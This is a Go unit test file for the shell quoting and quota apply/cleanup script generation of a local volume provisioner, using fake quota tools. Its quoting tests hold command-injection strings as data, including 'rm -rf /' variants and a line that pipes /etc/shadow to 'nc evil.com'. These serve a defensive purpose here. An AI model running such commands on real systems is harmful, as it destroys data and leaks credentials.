package app

import (
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestShellQuote(t *testing.T) {
	tests := map[string]struct {
		input    string
		expected string
	}{
		"simple path": {
			input:    "/var/openebs/local",
			expected: "'/var/openebs/local'",
		},
		"empty string": {
			input:    "",
			expected: "''",
		},
		"string with spaces": {
			input:    "/var/my path/local",
			expected: "'/var/my path/local'",
		},
		"string with double quotes": {
			input:    `/var/"openebs"/local`,
			expected: `'/var/"openebs"/local'`,
		},
		"string with single quote": {
			input:    "/var/open'ebs/local",
			expected: "'/var/open'\"'\"'ebs/local'",
		},
		"command injection via double quotes": {
			input:    `"; rm -rf / #`,
			expected: `'"; rm -rf / #'`,
		},
		"command injection via backticks": {
			input:    "`rm -rf /`",
			expected: "'`rm -rf /`'",
		},
		"command injection via dollar expansion": {
			input:    "$(rm -rf /)",
			expected: "'$(rm -rf /)'",
		},
		"command injection via single quote breakout": {
			input:    "'; rm -rf / '",
			expected: "''\"'\"'; rm -rf / '\"'\"''",
		},
		"newline injection": {
			input:    "/var/openebs\n; rm -rf /",
			expected: "'/var/openebs\n; rm -rf /'",
		},
		"semicolon and pipe": {
			input:    "/path; cat /etc/shadow | nc evil.com 1234",
			expected: "'/path; cat /etc/shadow | nc evil.com 1234'",
		},
	}

	for name, tc := range tests {
		t.Run(name, func(t *testing.T) {
			got := shellQuote(tc.input)
			if got != tc.expected {
				t.Errorf("shellQuote(%q) = %q, want %q", tc.input, got, tc.expected)
			}
		})
	}
}

func TestGenerateQuotaApplyScript_UsesShellQuoting(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		SoftLimitGrace: "1024k",
		HardLimitGrace: "2048k",
		HostPathPrefix: "",
	}

	script := GenerateQuotaApplyScript(cfg)

	// Verify that values are single-quoted, not double-quoted
	if !strings.Contains(script, "PARENT_PATH='/var/openebs/local'") {
		t.Errorf("expected single-quoted PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "VOLUME_PATH='/var/openebs/local/pvc-abc123'") {
		t.Errorf("expected single-quoted VOLUME_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "XFS_SOFT='1024k'") {
		t.Errorf("expected single-quoted XFS_SOFT, got:\n%s", script)
	}
}

func TestGenerateQuotaCleanupScript_UsesShellQuoting(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/var/openebs/local",
		VolumeDir:      "pvc-abc123",
		HostPathPrefix: "/host",
	}

	script := GenerateQuotaCleanupScript(cfg)

	// PARENT_PATH / VOLUME_PATH stay as host paths (used with nsenter).
	if !strings.Contains(script, "PARENT_PATH='/var/openebs/local'") {
		t.Errorf("expected single-quoted host PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "VOLUME_PATH='/var/openebs/local/pvc-abc123'") {
		t.Errorf("expected single-quoted host VOLUME_PATH, got:\n%s", script)
	}
	// Container-visible path is for flock / path existence under the bind-mount.
	if !strings.Contains(script, "CONTAINER_PARENT_PATH='/host/var/openebs/local'") {
		t.Errorf("expected single-quoted prefixed CONTAINER_PARENT_PATH, got:\n%s", script)
	}
}

func TestGenerateQuotaCleanupScript_InjectionAttempt(t *testing.T) {
	// Simulate a malicious BasePath that made it past other checks
	cfg := QuotaScriptConfig{
		ParentDir:      "'; rm -rf / #",
		VolumeDir:      "pvc-abc123",
		HostPathPrefix: "",
	}

	script := GenerateQuotaCleanupScript(cfg)

	// The malicious content should be safely contained in single quotes.
	// It must NOT appear as unquoted shell syntax.
	if strings.Contains(script, "PARENT_PATH=';") {
		t.Errorf("injection not neutralized — malicious content escaped quotes:\n%s", script)
	}
	// The single-quote in the payload should be escaped
	if !strings.Contains(script, `'"'"'`) {
		t.Errorf("expected single-quote escaping in output:\n%s", script)
	}
}

func TestGenerateQuotaApplyScript_UsesMountPointAndNumericProjectIDs(t *testing.T) {
	tests := []struct {
		name     string
		fs       string
		commands map[string]string
		wantLog  []string
	}{
		{
			name: "xfs",
			fs:   "xfs",
			commands: map[string]string{
				"xfs_quota": `printf 'xfs_quota %s\n' "$*" >> "$COMMAND_LOG"
case "$*" in
*"report -h -n"*) printf '#41 0 0\nfooter\n' ;;
*"report"*) printf 'named-project 0 0\nfooter\n' ;;
esac`,
			},
			wantLog: []string{
				"xfs_quota -x -c report -h -n /resolved/quota-mount",
				"xfs_quota -x -c project -s -p ",
				" 42 /resolved/quota-mount",
				"xfs_quota -x -c limit -p bsoft=1024k bhard=2048k 42 /resolved/quota-mount",
			},
		},
		{
			name: "ext4",
			fs:   "ext2/ext3",
			commands: map[string]string{
				"repquota": `printf 'repquota %s\n' "$*" >> "$COMMAND_LOG"
printf '#41 -- 0 0\nfooter\nfooter\n'`,
				"chattr":   `printf 'chattr %s\n' "$*" >> "$COMMAND_LOG"`,
				"setquota": `printf 'setquota %s\n' "$*" >> "$COMMAND_LOG"`,
			},
			wantLog: []string{
				"repquota -P -n /resolved/quota-mount",
				"chattr +P -p 42 ",
				"setquota -P 42 1024 2048 0 0 /resolved/quota-mount",
			},
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			root := t.TempDir()
			parentDir := filepath.Join(root, "host", "base")
			volumeDir := "pvc-abc123"
			if err := os.MkdirAll(filepath.Join(parentDir, volumeDir), 0o755); err != nil {
				t.Fatal(err)
			}
			hostPrefix := filepath.Join(root, "host-root")
			namespacePath := filepath.Join(hostPrefix, "proc", "1", "ns", "mnt")
			if err := os.MkdirAll(filepath.Dir(namespacePath), 0o755); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(namespacePath, nil, 0o644); err != nil {
				t.Fatal(err)
			}

			binDir := filepath.Join(root, "bin")
			if err := os.Mkdir(binDir, 0o755); err != nil {
				t.Fatal(err)
			}
			writeFakeCommand(t, binDir, "nsenter", `printf 'nsenter %s\n' "$*" >> "$COMMAND_LOG"
while [ "$#" -gt 0 ]; do
    if [ "$1" = "--" ]; then shift; break; fi
    shift
done
"$@"`)
			writeFakeCommand(t, binDir, "findmnt", `printf 'findmnt %s\n' "$*" >> "$COMMAND_LOG"
printf '/resolved/quota-mount\n'`)
			writeFakeCommand(t, binDir, "stat", `printf '%s\n' "$FAKE_FS"`)
			for name, body := range tc.commands {
				writeFakeCommand(t, binDir, name, body)
			}

			script := GenerateQuotaApplyScript(QuotaScriptConfig{
				ParentDir:          parentDir,
				VolumeDir:          volumeDir,
				SoftLimitGrace:     "1024k",
				HardLimitGrace:     "2048k",
				HostPathPrefix:     hostPrefix,
				ContainerParentDir: filepath.Join(root, "container", "base"),
			})
			log := runGeneratedScript(t, script, binDir, "FAKE_FS="+tc.fs)
			for _, want := range tc.wantLog {
				if !strings.Contains(log, want) {
					t.Errorf("command log missing %q:\n%s", want, log)
				}
			}
		})
	}
}

func TestGenerateQuotaCleanupScript_DoesNotRequireHostNamespaceWithoutProjectQuota(t *testing.T) {
	root := t.TempDir()
	containerParent := filepath.Join(root, "container", "base")
	volumeDir := "pvc-abc123"
	containerVolume := filepath.Join(containerParent, volumeDir)
	if err := os.MkdirAll(containerVolume, 0o755); err != nil {
		t.Fatal(err)
	}

	binDir := filepath.Join(root, "bin")
	if err := os.Mkdir(binDir, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFakeCommand(t, binDir, "stat", `printf 'xfs\n'`)
	writeFakeCommand(t, binDir, "xfs_io", `printf 'xfs_io %s\n' "$*" >> "$COMMAND_LOG"
printf 'projid = 0\n'`)
	writeFakeCommand(t, binDir, "nsenter", `printf 'nsenter %s\n' "$*" >> "$COMMAND_LOG"
exit 99`)

	script := GenerateQuotaCleanupScript(QuotaScriptConfig{
		ParentDir:          "/var/openebs/local",
		VolumeDir:          volumeDir,
		HostPathPrefix:     filepath.Join(root, "missing-host-root"),
		ContainerParentDir: containerParent,
	})
	log := runGeneratedScript(t, script, binDir)
	if strings.Contains(log, "nsenter ") {
		t.Fatalf("cleanup entered the host namespace without a project quota:\n%s", log)
	}
	if _, err := os.Stat(containerVolume); !os.IsNotExist(err) {
		t.Fatalf("container-visible volume was not removed: %v", err)
	}
}

func TestGenerateQuotaCleanupScript_ClearsQuotaAgainstMountPoint(t *testing.T) {
	root := t.TempDir()
	containerParent := filepath.Join(root, "container", "base")
	volumeDir := "pvc-abc123"
	containerVolume := filepath.Join(containerParent, volumeDir)
	if err := os.MkdirAll(containerVolume, 0o755); err != nil {
		t.Fatal(err)
	}
	hostPrefix := filepath.Join(root, "host-root")
	namespacePath := filepath.Join(hostPrefix, "proc", "1", "ns", "mnt")
	if err := os.MkdirAll(filepath.Dir(namespacePath), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(namespacePath, nil, 0o644); err != nil {
		t.Fatal(err)
	}

	binDir := filepath.Join(root, "bin")
	if err := os.Mkdir(binDir, 0o755); err != nil {
		t.Fatal(err)
	}
	writeFakeCommand(t, binDir, "stat", `printf 'xfs\n'`)
	writeFakeCommand(t, binDir, "xfs_io", `printf 'xfs_io %s\n' "$*" >> "$COMMAND_LOG"
case "$*" in
*"-c stat"*) printf 'projid = 41\n' ;;
esac`)
	writeFakeCommand(t, binDir, "nsenter", `printf 'nsenter %s\n' "$*" >> "$COMMAND_LOG"
while [ "$#" -gt 0 ]; do
    if [ "$1" = "--" ]; then shift; break; fi
    shift
done
"$@"`)
	writeFakeCommand(t, binDir, "findmnt", `printf 'findmnt %s\n' "$*" >> "$COMMAND_LOG"
printf '/resolved/quota-mount\n'`)
	writeFakeCommand(t, binDir, "xfs_quota", `printf 'xfs_quota %s\n' "$*" >> "$COMMAND_LOG"`)

	script := GenerateQuotaCleanupScript(QuotaScriptConfig{
		ParentDir:          "/var/openebs/local",
		VolumeDir:          volumeDir,
		HostPathPrefix:     hostPrefix,
		ContainerParentDir: containerParent,
	})
	log := runGeneratedScript(t, script, binDir)
	if !strings.Contains(log, "xfs_quota -x -c limit -p bsoft=0 bhard=0 41 /resolved/quota-mount") {
		t.Errorf("quota limit was not cleared against the containing mount point:\n%s", log)
	}
	for _, command := range []string{"stat ", "xfs_io ", "rm "} {
		if strings.Contains(log, "nsenter --mount="+namespacePath+" -- "+command) {
			t.Errorf("container-local cleanup command %q entered the host namespace:\n%s", command, log)
		}
	}
	if _, err := os.Stat(containerVolume); !os.IsNotExist(err) {
		t.Fatalf("container-visible volume was not removed: %v", err)
	}
}

// hasAssignment reports whether script contains a whole line like NAME='value'
// (shell-quoted assignment produced by the script generator). Matching whole
// lines avoids false positives from longer names (e.g. CONTAINER_PARENT_PATH
// containing the substring PARENT_PATH=...).
func hasAssignment(script, name, value string) bool {
	needle := name + "=" + shellQuote(value)
	for _, line := range strings.Split(script, "\n") {
		if strings.TrimSpace(line) == needle {
			return true
		}
	}
	return false
}

func TestGenerateQuotaApplyScript_WithoutHostPrefix_NoNsenter(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:      "/data",
		VolumeDir:      "pvc-abc123",
		SoftLimitGrace: "1024k",
		HardLimitGrace: "2048k",
		HostPathPrefix: "",
	}

	script := GenerateQuotaApplyScript(cfg)

	if strings.Contains(script, "HOST_MOUNT_NS=") {
		t.Errorf("did not expect HOST_MOUNT_NS without HostPathPrefix, got:\n%s", script)
	}
	if strings.Contains(script, "nsenter") {
		t.Errorf("did not expect nsenter without HostPathPrefix, got:\n%s", script)
	}
	// host_exec should be a passthrough.
	if !strings.Contains(script, `host_exec() { "$@"; }`) {
		t.Errorf("expected passthrough host_exec, got:\n%s", script)
	}
	if !strings.Contains(script, "CONTAINER_PARENT_PATH='/data'") {
		t.Errorf("expected CONTAINER_PARENT_PATH to equal ParentDir, got:\n%s", script)
	}
}

func TestGenerateQuotaApplyScript_UseHostLockOnContainerPath(t *testing.T) {
	cfg := QuotaScriptConfig{
		ParentDir:          "/var/openebs/local",
		VolumeDir:          "pvc-abc123",
		SoftLimitGrace:     "1024k",
		HardLimitGrace:     "2048k",
		HostPathPrefix:     "/host",
		ContainerParentDir: "/data",
		UseHostLock:        true,
	}

	script := GenerateQuotaApplyScript(cfg)

	// flock must open a container-visible path, not an unmapped host path.
	if !strings.Contains(script, `LOCKFILE="$CONTAINER_PARENT_PATH/.openebs-quota.lock"`) {
		t.Errorf("expected lockfile under CONTAINER_PARENT_PATH, got:\n%s", script)
	}
	if !strings.Contains(script, "CONTAINER_PARENT_PATH='/data'") {
		t.Errorf("expected container parent at the /data bind-mount, got:\n%s", script)
	}
	// Must not lock on the host path variable (invisible without nsenter).
	if strings.Contains(script, `LOCKFILE="$PARENT_PATH/.openebs-quota.lock"`) {
		t.Errorf("lockfile must not use PARENT_PATH (host path):\n%s", script)
	}
}

func writeFakeCommand(t *testing.T, dir, name, body string) {
	t.Helper()
	contents := "#!/bin/sh\nset -eu\n" + body + "\n"
	if err := os.WriteFile(filepath.Join(dir, name), []byte(contents), 0o755); err != nil {
		t.Fatal(err)
	}
}

func runGeneratedScript(t *testing.T, script, binDir string, extraEnv ...string) string {
	t.Helper()
	logPath := filepath.Join(t.TempDir(), "commands.log")
	cmd := exec.Command("bash", "-c", script)
	cmd.Env = append(os.Environ(), "PATH="+binDir+":"+os.Getenv("PATH"), "COMMAND_LOG="+logPath)
	cmd.Env = append(cmd.Env, extraEnv...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("generated script failed: %v\n%s\nscript:\n%s", err, output, script)
	}
	log, err := os.ReadFile(logPath)
	if err != nil && !os.IsNotExist(err) {
		t.Fatal(err)
	}
	return string(log)
}

func TestQuotaPaths(t *testing.T) {
	tests := []struct {
		name                string
		cfg                 QuotaScriptConfig
		wantHostParent      string
		wantHostVolume      string
		wantContainerParent string
		wantHostMountNS     string
	}{
		{
			name: "daemonset with host prefix",
			cfg: QuotaScriptConfig{
				ParentDir:      "/var/openebs/local",
				VolumeDir:      "pvc-1",
				HostPathPrefix: "/host",
			},
			wantHostParent:      "/var/openebs/local",
			wantHostVolume:      "/var/openebs/local/pvc-1",
			wantContainerParent: "/host/var/openebs/local",
			wantHostMountNS:     "/host/proc/1/ns/mnt",
		},
		{
			name: "helper pod flock uses data mount",
			cfg: QuotaScriptConfig{
				ParentDir:          "/var/openebs/local",
				VolumeDir:          "pvc-2",
				HostPathPrefix:     HostPathPrefix,
				ContainerParentDir: "/data",
			},
			wantHostParent:      "/var/openebs/local",
			wantHostVolume:      "/var/openebs/local/pvc-2",
			wantContainerParent: "/data",
			wantHostMountNS:     "/host/proc/1/ns/mnt",
		},
		{
			name: "no host prefix",
			cfg: QuotaScriptConfig{
				ParentDir:      "/data",
				VolumeDir:      "pvc-3",
				HostPathPrefix: "",
			},
			wantHostParent:      "/data",
			wantHostVolume:      "/data/pvc-3",
			wantContainerParent: "/data",
			wantHostMountNS:     "",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			hp, hv, cp := quotaPaths(tc.cfg)
			if hp != tc.wantHostParent || hv != tc.wantHostVolume || cp != tc.wantContainerParent {
				t.Errorf("quotaPaths() = (%q, %q, %q), want (%q, %q, %q)",
					hp, hv, cp, tc.wantHostParent, tc.wantHostVolume, tc.wantContainerParent)
			}
			if got := hostMountNSPath(tc.cfg); got != tc.wantHostMountNS {
				t.Errorf("hostMountNSPath() = %q, want %q", got, tc.wantHostMountNS)
			}
		})
	}
}
